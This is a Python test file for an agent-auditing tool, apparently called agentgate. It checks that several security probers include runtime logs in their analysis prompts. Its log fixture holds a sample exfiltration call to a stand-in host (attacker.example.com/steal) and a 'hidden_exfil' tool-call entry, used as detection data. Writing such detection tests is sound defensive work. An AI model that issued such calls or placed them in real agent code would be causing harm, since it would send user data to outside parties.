from __future__ import annotations

from agentgate.trust.runtime.adaptive.models import ContextBundle, ProbeResult
from agentgate.trust.runtime.adaptive.specialists.tool_exerciser import ToolExerciser
from agentgate.trust.runtime.adaptive.specialists.egress_prober import EgressProber
from agentgate.trust.runtime.adaptive.specialists.canary_stresser import CanaryStresser
from agentgate.trust.runtime.adaptive.specialists.data_boundary import DataBoundaryTester
from agentgate.trust.runtime.adaptive.specialists.behavior_consistency import (
    BehaviorConsistencyChecker,
)


def _make_bundle() -> ContextBundle:
    return ContextBundle(
        source_files={"agent.py": "def process(q): pass\n"},
        manifest={"agent_name": "Test"},
        static_findings=[],
        live_url="https://agent.example.com",
        canary_tokens={"FAKE_KEY": "canary123"},
        declared_tools=["lookup_order"],
        declared_domains=[],
        customer_data_access=["orders"],
        permissions=["read_orders"],
    )


def _make_results() -> list[ProbeResult]:
    return [
        ProbeResult(
            specialist="test",
            method="POST",
            path="/api/v1/chat",
            request_body={"question": "order #123"},
            status_code=200,
            response_body='{"answer": "shipped"}',
            content_type="application/json",
        )
    ]


_RAILWAY_LOGS = (
    "TOOL_CALL:lookup_order\n"
    "TOOL_CALL:hidden_exfil\n"
    "httpx.get('https://attacker.example.com/steal')\n"
)


def test_tool_exerciser_includes_logs_in_analysis() -> None:
    specialist = ToolExerciser()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "TOOL_CALL:lookup_order" in prompt
    assert "TOOL_CALL:hidden_exfil" in prompt
    assert "attacker.example.com" in prompt


def test_egress_prober_includes_logs_in_analysis() -> None:
    specialist = EgressProber()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "attacker.example.com" in prompt


def test_canary_stresser_includes_logs_in_analysis() -> None:
    specialist = CanaryStresser()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "TOOL_CALL:hidden_exfil" in prompt


def test_data_boundary_includes_logs_in_analysis() -> None:
    specialist = DataBoundaryTester()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "attacker.example.com" in prompt


def test_behavior_consistency_includes_logs_in_analysis() -> None:
    specialist = BehaviorConsistencyChecker()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=_RAILWAY_LOGS
    )
    assert "TOOL_CALL:hidden_exfil" in prompt


def test_analysis_prompt_works_without_logs() -> None:
    specialist = ToolExerciser()
    prompt = specialist.build_analysis_prompt(
        _make_bundle(), _make_results(), railway_logs=""
    )
    assert "shipped" in prompt
